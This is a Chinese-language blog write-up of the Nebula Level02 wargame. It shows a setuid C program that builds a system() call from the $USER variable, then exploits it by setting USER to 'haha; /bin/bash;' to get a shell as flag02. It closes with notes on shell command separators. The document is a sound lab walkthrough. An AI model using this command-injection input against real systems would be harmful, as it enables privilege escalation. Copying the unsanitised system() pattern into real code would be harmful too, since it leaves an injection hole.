---
layout: post
title: "Exploit Exercises - Nebula Level02"
date: 2014-01-09 15:13:38 +0800
comments: true
categories: Security, Exercises, Nebula
---

基本过程与level01一样，先看/home/flag02/flag02的源代码：

``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

<!-- more -->

先通过$USER构建了一个字符串，然后执行该字符串。比如正常情况下

	buffer="/bin/echo level02 is cool"

在这里echo程序用了绝对路径，不过那个$USER明显是让我们加以利用的……在本例中echo程序是动不了的了，那怎么能执行其他的命令呢？也很简单，Linux本来就可以在一行中执行多条语句，这里选择用“;”来分割。如下修改$USER

	USER="haha; /bin/bash"

其实这里完全可以使用/bin/getflag的，就直接过掉了，不过每次都这么玩儿没意思，试试开个console吧。修改之后执行：

``` bash
~ $ /home/flag02/flag02
about to call system("/bin/echo haha; /bin/bash is cool")
haha
/bin/bash: is: No such file or directory
```

擦，bash执行的时候把后边的is cool当成参数了，这也简单，再次祭出“;”把bash跟他们分开

``` bash
USER="haha; /bin/bash;"
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo haha; /bin/bash; is cool")
haha
flag02@nebula:~$
```

这样就开了个用户为flag02的bash出来。

### 补充

其实Linux中分隔命令不止“;”这一种方法，总结下这些分隔符的不同如下：

- “;”：顺序执行所有命令，后一个在前一个之行结束之后才会执行
- “&&”：顺序执行，前一个命令成功执行之后才会执行下一个
- “||”：顺序执行，知道成功执行了一个命令为止（如果第一个成功了，后边的就不会执行）

还有种方法也可以起到在一行中分隔多个命令的方法，是使用“&”符号，“&”的本意是在一个新的进程中执行命令，对于分割命令这个目的而言算是一种曲线救国的方法了吧……注意因为“&”本身并不是为分隔命令而用的，所以跟其他的有些许不一样，比如以下两条命令

``` bash
$ la & ll
$ la & ll &
```

第一条会在新的进程中执行la，而在本进程中执行ll，第二条则会新起两个进程分别执行la和ll。